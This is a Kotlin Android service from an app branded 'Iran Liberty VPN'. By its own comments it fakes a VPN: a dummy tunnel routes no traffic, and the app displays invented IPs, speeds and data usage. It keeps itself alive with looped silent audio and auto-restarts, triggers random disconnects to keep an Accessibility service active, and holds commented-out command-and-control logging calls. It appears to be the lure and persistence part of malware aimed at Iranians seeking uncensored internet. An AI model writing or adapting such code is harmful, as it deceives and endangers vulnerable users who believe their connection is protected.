package com.iran.liberty.vpn

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Intent
import android.net.VpnService
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import androidx.media3.common.MediaItem
import androidx.media3.common.PlaybackException
import androidx.media3.common.Player
import androidx.media3.exoplayer.ExoPlayer
import androidx.media3.exoplayer.audio.AudioAttributes
import kotlin.random.Random
import java.util.concurrent.TimeUnit

/**
 * Fake VPN Service that appears to be a real VPN but only establishes a dummy tunnel.
 * This service maintains foreground status with silent audio playback to resist Doze mode.
 * 
 * Key responsibilities:
 * 1. Fake VPN tunnel establishment (no real packet routing)
 * 2. Foreground notification management
 * 3. Random disconnect simulation (4-12 hours)
 * 4. Silent audio playback loop for Doze resistance
 * 5. Auto-restart on kill attempts
 */
class FakeVpnService : VpnService() {

    //region Constants and State Variables
    
    companion object {
        private const val NOTIFICATION_CHANNEL_ID = "vpn_service_channel"
        private const val NOTIFICATION_ID = 101
        private const val SERVICE_NAME = "IranLibertyVPN"
        private const val SILENT_AUDIO_URI = "raw:///silent_audio.opus"
        private const val RECONNECT_DELAY_MIN_MS = 10000L // 10 seconds
        private const val RECONNECT_DELAY_MAX_MS = 30000L // 30 seconds
    }

    private lateinit var exoPlayer: ExoPlayer
    private val handler = Handler(Looper.getMainLooper())
    private var isRunning = false
    private var disconnectScheduled = false
    private var connectedServer = "Netherlands - Secure"
    private var connectedSince = System.currentTimeMillis()
    private var fakeDataUsed = 0L
    private var fakeUploadSpeed = 0.0
    private var fakeDownloadSpeed = 0.0
    
    //endregion
    
    //region Service Lifecycle
    
    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        initializeSilentAudioPlayer()
        startForegroundWithNotification()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_CONNECT -> {
                if (!isRunning) {
                    startFakeVpn()
                }
            }
            ACTION_DISCONNECT -> {
                stopFakeVpn()
            }
            ACTION_RECONNECT -> {
                scheduleReconnect()
            }
            else -> {
                // Default action: start VPN if not running
                if (!isRunning) {
                    startFakeVpn()
                }
            }
        }
        return START_STICKY // Auto-restart if killed
    }

    override fun onDestroy() {
        cleanupResources()
        super.onDestroy()
        // Auto-restart logic - service will be restarted by system due to START_STICKY
        // Additional restart handled by BootReceiver (Pathway 1)
    }

    override fun onRevoke() {
        // VPN permission was revoked by user
        stopSelf()
    }

    override fun onBind(intent: Intent?): IBinder? = null
    
    //endregion
    
    //region Fake VPN Implementation
    
    /**
     * Establishes a fake VPN tunnel without actually routing packets.
     * This creates the appearance of a working VPN connection.
     */
    private fun startFakeVpn() {
        if (isRunning) return
        
        try {
            // Configure fake VPN builder
            val builder = Builder()
            builder.setSession(SERVICE_NAME)
            builder.setMtu(1500)
            
            // Add fake DNS servers (common public DNS)
            builder.addDnsServer("8.8.8.8") // Google DNS
            builder.addDnsServer("1.1.1.1") // Cloudflare DNS
            
            // Add fake routes
            builder.addRoute("0.0.0.0", 0) // Route all traffic
            
            // Add fake addresses (simulate foreign IP)
            val fakeIp = generateFakeIp()
            builder.addAddress(fakeIp, 24)
            
            // Establish the fake VPN interface
            val interfaceName = builder.establish()?.interfaceName
            
            if (interfaceName != null) {
                isRunning = true
                connectedSince = System.currentTimeMillis()
                startSilentAudioPlayback()
                scheduleRandomDisconnect()
                updateNotification(true)
                
                // Start fake stats updates
                startFakeStatsUpdates()
                
                // Log success (in real implementation would be to C2)
                // C2Manager.logEvent("VPN_STARTED", mapOf("server" to connectedServer))
            } else {
                // Failed to establish - schedule retry
                scheduleReconnect()
            }
        } catch (e: Exception) {
            // If establishment fails, try again after delay
            scheduleReconnect()
        }
    }
    
    /**
     * Stops the fake VPN connection with simulated disconnection delay.
     */
    private fun stopFakeVpn() {
        if (!isRunning) return
        
        // Simulate disconnection delay (1-3 seconds as per requirements)
        handler.postDelayed({
            try {
                // Stop the VPN interface
                isRunning = false
                stopSilentAudioPlayback()
                cancelDisconnectSchedule()
                cancelStatsUpdates()
                updateNotification(false)
                
                // In real VpnService, we would call super.onDestroy() or close the interface
                // For fake implementation, we just update state
                
                // Log disconnection
                // C2Manager.logEvent("VPN_STOPPED", null)
                
            } catch (e: Exception) {
                // Ignore errors during stop
            }
        }, Random.nextLong(1000, 3000)) // 1-3 second delay
    }
    
    /**
     * Generates a random fake IP address for display purposes.
     * Format: Foreign-looking IPs (European/US ranges)
     */
    private fun generateFakeIp(): String {
        val ranges = listOf(
            "172.104",  // European
            "192.81",   // US
            "104.238",  // US
            "89.238",   // European
            "195.201"   // German
        )
        val base = ranges.random()
        val third = Random.nextInt(1, 255)
        val fourth = Random.nextInt(1, 255)
        return "$base.$third.$fourth"
    }
    
    //endregion
    
    //region Silent Audio Playback (Doze Resistance)
    
    /**
     * Initializes ExoPlayer for silent audio playback.
     * Silent audio keeps the service in foreground and prevents Doze mode from stopping it.
     */
    private fun initializeSilentAudioPlayer() {
        exoPlayer = ExoPlayer.Builder(this).build()
        
        // Configure audio attributes for silent playback
        val audioAttributes = AudioAttributes.Builder()
            .setUsage(androidx.media3.common.C.USAGE_MEDIA)
            .setContentType(androidx.media3.common.C.AUDIO_CONTENT_TYPE_MUSIC)
            .build()
        exoPlayer.setAudioAttributes(audioAttributes, false)
        exoPlayer.volume = 0f // Completely silent
        
        // Set to loop indefinitely
        exoPlayer.repeatMode = Player.REPEAT_MODE_ALL
        
        // Prepare media item (would be a silent opus file in resources)
        val mediaItem = MediaItem.fromUri(SILENT_AUDIO_URI)
        exoPlayer.setMediaItem(mediaItem)
        
        exoPlayer.prepare()
        
        // Error listener for debugging
        exoPlayer.addListener(object : Player.Listener {
            override fun onPlayerError(error: PlaybackException) {
                // If audio fails, we still want to keep service alive
                // Could try to reinitialize or continue without audio
                // C2Manager.logEvent("AUDIO_ERROR", mapOf("error" to error.message ?: "unknown"))
            }
        })
    }
    
    /**
     * Starts the silent audio playback loop.
     */
    private fun startSilentAudioPlayback() {
        if (!exoPlayer.isPlaying) {
            exoPlayer.play()
        }
    }
    
    /**
     * Stops the silent audio playback.
     */
    private fun stopSilentAudioPlayback() {
        if (exoPlayer.isPlaying) {
            exoPlayer.pause()
        }
    }
    
    //endregion
    
    //region Notification Management
    
    /**
     * Creates the notification channel for Android O+.
     */
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                "VPN Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Iran Liberty VPN is protecting your connection"
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_PUBLIC
            }
            
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }
    
    /**
     * Starts the service in foreground with a persistent notification.
     */
    private fun startForegroundWithNotification() {
        val notification = buildNotification(isConnected = false)
        startForeground(NOTIFICATION_ID, notification)
    }
    
    /**
     * Builds the foreground notification with dynamic status.
     * @param isConnected Whether VPN is currently "connected"
     */
    private fun buildNotification(isConnected: Boolean): Notification {
        // Create pending intent to open app when notification is tapped
        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
        }
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        
        // Build notification based on connection state
        val title = if (isConnected) {
            "Iran Liberty VPN - Connected"
        } else {
            "Iran Liberty VPN - Disconnected"
        }
        
        val text = if (isConnected) {
            "Protecting your connection to $connectedServer"
        } else {
            "Tap to connect to free internet"
        }
        
        // Calculate connection duration
        val duration = if (isConnected) {
            val minutes = TimeUnit.MILLISECONDS.toMinutes(System.currentTimeMillis() - connectedSince)
            "${minutes}m connected"
        } else {
            "Ready to connect"
        }
        
        return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle(title)
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_lock_lock) // Placeholder - will be replaced with app icon
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true) // Persistent notification
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setVisibility(NotificationCompat.VISIBILITY_PUBLIC)
            .setShowWhen(false)
            .setStyle(NotificationCompat.BigTextStyle()
                .bigText("$text\n$duration\nData used: ${formatData(fakeDataUsed)}"))
            .build()
    }
    
    /**
     * Updates the foreground notification with current status.
     * @param isConnected Whether VPN is currently "connected"
     */
    private fun updateNotification(isConnected: Boolean) {
        val notification = buildNotification(isConnected)
        val notificationManager = getSystemService(NotificationManager::class.java)
        notificationManager.notify(NOTIFICATION_ID, notification)
    }
    
    /**
     * Formats data usage for display.
     */
    private fun formatData(bytes: Long): String {
        return when {
            bytes >= 1024 * 1024 * 1024 -> String.format("%.2f GB", bytes / (1024.0 * 1024.0 * 1024.0))
            bytes >= 1024 * 1024 -> String.format("%.2f MB", bytes / (1024.0 * 1024.0))
            bytes >= 1024 -> String.format("%.2f KB", bytes / 1024.0)
            else -> "$bytes B"
        }
    }
    
    //endregion
    
    //region Random Disconnect Simulation
    
    /**
     * Schedules a random disconnect between 4-12 hours to simulate real VPN behavior.
     * This prompts user interaction and keeps Accessibility service alive.
     */
    private fun scheduleRandomDisconnect() {
        if (disconnectScheduled) return
        
        val disconnectDelay = Random.nextLong(
            TimeUnit.HOURS.toMillis(4),
            TimeUnit.HOURS.toMillis(12)
        )
        
        handler.postDelayed({
            simulateRandomDisconnect()
        }, disconnectDelay)
        
        disconnectScheduled = true
        
        // Log scheduled disconnect (for C2 in real implementation)
        // C2Manager.logEvent("DISCONNECT_SCHEDULED", mapOf("delay_hours" to TimeUnit.MILLISECONDS.toHours(disconnectDelay)))
    }
    
    /**
     * Simulates a random VPN disconnect with notification.
     */
    private fun simulateRandomDisconnect() {
        if (!isRunning) return
        
        // Update notification to show disconnection
        val notification = NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle("Iran Liberty VPN - Connection Lost")
            .setContentText("Tap to reconnect to free internet")
            .setSmallIcon(android.R.drawable.ic_dialog_alert)
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
            .setAutoCancel(true)
            .build()
        
        val notificationManager = getSystemService(NotificationManager::class.java)
        notificationManager.notify(NOTIFICATION_ID + 1, notification)
        
        // Stop the fake VPN
        stopFakeVpn()
        
        // Reset schedule flag
        disconnectScheduled = false
        
        // Log disconnect event
        // C2Manager.logEvent("RANDOM_DISCONNECT", null)
    }
    
    /**
     * Cancels any scheduled disconnect.
     */
    private fun cancelDisconnectSchedule() {
        handler.removeCallbacksAndMessages(null)
        disconnectScheduled = false
    }
    
    //endregion
    
    //region Fake Stats Generation
    
    /**
     * Starts periodic updates of fake VPN statistics.
     */
    private fun startFakeStatsUpdates() {
        handler.postDelayed(object : Runnable {
            override fun run() {
                if (isRunning) {
                    updateFakeStats()
                    updateNotification(true)
                    handler.postDelayed(this, 3000) // Update every 3 seconds
                }
            }
        }, 3000)
    }
    
    /**
     * Updates fake VPN statistics for display.
     */
    private fun updateFakeStats() {
        // Generate realistic-looking fake stats
        fakeUploadSpeed = Random.nextDouble(0.5, 5.0)
        fakeDownloadSpeed = Random.nextDouble(2.0, 12.0)
        
        // Increment data used (simulate usage)
        val increment = Random.nextLong(10000, 100000) // 10KB - 100KB per update
        fakeDataUsed += increment
    }
    
    /**
     * Cancels fake stats updates.
     */
    private fun cancelStatsUpdates() {
        handler.removeCallbacksAndMessages(null)
    }
    
    //endregion
    
    //region Service Survival & Restart
    
    /**
     * Schedules a service reconnect after a random delay.
     * Used when service is killed or fails to start.
     */
    private fun scheduleReconnect() {
        val delay = Random.nextLong(RECONNECT_DELAY_MIN_MS, RECONNECT_DELAY_MAX_MS)
        
        handler.postDelayed({
            val restartIntent = Intent(this, FakeVpnService::class.java).apply {
                action = ACTION_CONNECT
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(restartIntent)
            } else {
                startService(restartIntent)
            }
        }, delay)
        
        // Log reconnect attempt
        // C2Manager.logEvent("RECONNECT_SCHEDULED", mapOf("delay_ms" to delay))
    }
    
    /**
     * Cleans up all resources when service is destroyed.
     */
    private fun cleanupResources() {
        cancelDisconnectSchedule()
        cancelStatsUpdates()
        stopSilentAudioPlayback()
        exoPlayer.release()
    }
    
    //endregion
    
    //region Intent Actions
    
    /**
     * Intent actions for controlling the VPN service.
     */
    object Actions {
        const val ACTION_CONNECT = "com.iran.liberty.vpn.CONNECT"
        const val ACTION_DISCONNECT = "com.iran.liberty.vpn.DISCONNECT"
        const val ACTION_RECONNECT = "com.iran.liberty.vpn.RECONNECT"
    }
    
    private val ACTION_CONNECT = Actions.ACTION_CONNECT
    private val ACTION_DISCONNECT = Actions.ACTION_DISCONNECT
    private val ACTION_RECONNECT = Actions.ACTION_RECONNECT
    
    //endregion
}